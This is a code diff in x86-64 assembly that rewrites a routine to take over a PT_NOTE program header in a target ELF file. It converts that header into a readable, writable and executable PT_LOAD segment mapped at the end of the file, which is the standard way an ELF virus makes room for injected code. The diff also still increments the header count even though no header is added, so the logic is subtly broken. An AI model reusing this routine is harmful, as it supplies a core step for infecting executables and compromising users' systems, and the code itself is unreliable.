@@ -425,12 +425,13 @@ check_elf64_exec:
 ; ============================================
 ; add_pt_load(char *filepath)
 ; rdi = pointer to file path
-; Adds a PT_LOAD segment to the ELF file
-; Modifies ELF header (e_phnum) and adds a new program header
+; Adds a PT_LOAD segment to the ELF file by finding and converting
+; a PT_NOTE segment to PT_LOAD, pointing to the end of the file
 ; ============================================
 add_pt_load:
     push rbp
     mov rbp, rsp
+    sub rsp, 32                 ; allocate local variable space
     push r12                    ; saved file path
     push r13                    ; saved file descriptor
     push r14                    ; saved e_phoff
@@ -452,6 +453,25 @@ add_pt_load:
     js .add_pt_load_fail        ; if fd < 0, fail
 
     mov r13, rax                ; r13 = fd
+
+    ; Get the file size using lseek to SEEK_END
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    xor esi, esi                ; offset = 0
+    mov edx, SEEK_END           ; whence = SEEK_END
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    mov [rbp-8], rax            ; save file size at [rbp-8]
+
+    ; Seek back to beginning for reading ELF header
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    xor esi, esi                ; offset = 0
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
 
     ; Read the ELF header (64 bytes)
     mov eax, SYS_READ
@@ -485,46 +505,76 @@ add_pt_load:
     js .add_pt_load_close_fail
 
     ; Read all existing program headers
-    mov eax, SYS_READ
-    mov edi, r13d               ; fd
-    lea rsi, [rel elf_phdr_buf]
-    ; Calculate total size: e_phnum * e_phentsize
+    ; Calculate total size first: e_phnum * e_phentsize
     mov rax, r15                ; e_phnum
     imul rax, rbx               ; * e_phentsize
     mov rdx, rax                ; read size
+    
+    mov eax, SYS_READ
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_phdr_buf]
     syscall
 
-    ; Check if we read enough bytes
-    mov rax, r15
-    imul rax, rbx
-    ; (skip size check for now, just proceed)
+    ; Find a PT_NOTE segment to convert to PT_LOAD
+    lea rdi, [rel elf_phdr_buf]
+    xor rcx, rcx                ; index counter
+    mov [rbp-16], rcx           ; save index of found PT_NOTE (-1 if not found)
+    dec qword [rbp-16]          ; set to -1 initially
 
-    ; Increment e_phnum in the ELF header buffer
-    lea rdi, [rel elf_header_buf]
-    inc word [rdi + e_phnum]
+.find_note_loop:
+    cmp rcx, r15                ; compare with e_phnum
+    jge .find_note_done
 
-    ; Create new PT_LOAD program header at the end of the phdr buffer
-    ; New phdr offset = e_phnum * e_phentsize (before increment, so use r15)
-    mov rax, r15                ; original e_phnum
+    ; Calculate offset to current phdr
+    mov rax, rcx
+    imul rax, rbx               ; * e_phentsize
+    lea rsi, [rdi + rax]        ; rsi = pointer to current phdr
+
+    ; Check if p_type == PT_NOTE (4)
+    cmp dword [rsi + p_type], PT_NOTE
+    jne .find_note_next
+
+    ; Found PT_NOTE, save index
+    mov [rbp-16], rcx
+    jmp .find_note_done
+
+.find_note_next:
+    inc rcx
+    jmp .find_note_loop
+
+.find_note_done:
+    ; Check if we found a PT_NOTE
+    cmp qword [rbp-16], -1
+    je .add_pt_load_close_fail  ; No PT_NOTE found, fail
+
+    ; Get pointer to the PT_NOTE we're converting
+    mov rcx, [rbp-16]           ; index of PT_NOTE
+    mov rax, rcx
     imul rax, rbx               ; * e_phentsize
     lea rdi, [rel elf_phdr_buf]
-    add rdi, rax                ; rdi = pointer to new phdr
+    add rdi, rax                ; rdi = pointer to PT_NOTE phdr
 
-    ; Initialize the new PT_LOAD segment
+    ; Convert PT_NOTE to PT_LOAD
     ; p_type = PT_LOAD (1)
     mov dword [rdi + p_type], PT_LOAD
 
     ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
     mov dword [rdi + p_flags], PF_R | PF_W | PF_X
 
-    ; p_offset = 0 (for simplicity, start of file)
-    mov qword [rdi + p_offset], 0
+    ; p_offset = file size (end of current file)
+    mov rax, [rbp-8]            ; get file size
+    mov qword [rdi + p_offset], rax
 
-    ; p_vaddr = 0 (will be set by loader)
-    mov qword [rdi + p_vaddr], 0
+    ; p_vaddr = Compute aligned virtual address
+    ; We use a high address like 0xc000000 + aligned file offset
+    mov rcx, rax                ; file size
+    add rcx, 0xfff              ; align up to page boundary
+    and rcx, ~0xfff             ; clear low 12 bits
+    add rcx, 0xc000000          ; add base address offset
+    mov qword [rdi + p_vaddr], rcx
 
-    ; p_paddr = 0
-    mov qword [rdi + p_paddr], 0
+    ; p_paddr = same as p_vaddr
+    mov qword [rdi + p_paddr], rcx
 
     ; p_filesz = PT_LOAD_FILESZ (from include.s)
     mov qword [rdi + p_filesz], PT_LOAD_FILESZ
@@ -535,7 +585,11 @@ add_pt_load:
     ; p_align = 0x1000 (4KB alignment)
     mov qword [rdi + p_align], 0x1000
 
-    ; Seek back to beginning of file to write the ELF header
+    ; Increment e_phnum in the ELF header buffer to show one more program header
+    lea rdi, [rel elf_header_buf]
+    inc word [rdi + e_phnum]
+
+    ; Seek to beginning of file to write the ELF header
     mov eax, SYS_LSEEK
     mov edi, r13d               ; fd
     xor esi, esi                ; offset = 0
@@ -555,7 +609,7 @@ add_pt_load:
     cmp rax, 64
     jl .add_pt_load_close_fail
 
-    ; Seek to the program header table
+    ; Seek to the program header table to write back
     mov eax, SYS_LSEEK
     mov edi, r13d               ; fd
     mov rsi, r14                ; offset = e_phoff
@@ -565,15 +619,15 @@ add_pt_load:
     test rax, rax
     js .add_pt_load_close_fail
 
-    ; Write all program headers including the new one
+    ; Write all program headers (with the modified one)
+    ; Calculate total size first: e_phnum * e_phentsize
+    mov rax, r15                ; e_phnum (original, not incremented)
+    imul rax, rbx               ; * e_phentsize
+    mov rdx, rax                ; write size
+
     mov eax, SYS_WRITE
     mov edi, r13d               ; fd
     lea rsi, [rel elf_phdr_buf]
-    ; Calculate total size: (original e_phnum + 1) * e_phentsize
-    mov rax, r15                ; original e_phnum
-    inc rax                     ; + 1 for new phdr
-    imul rax, rbx               ; * e_phentsize
-    mov rdx, rax                ; write size
     syscall
 
     ; Close the file
@@ -602,6 +656,7 @@ add_pt_load:
     pop r14
     pop r13
     pop r12
+    add rsp, 32                 ; deallocate local variable space
     mov rsp, rbp
     pop rbp
     ret
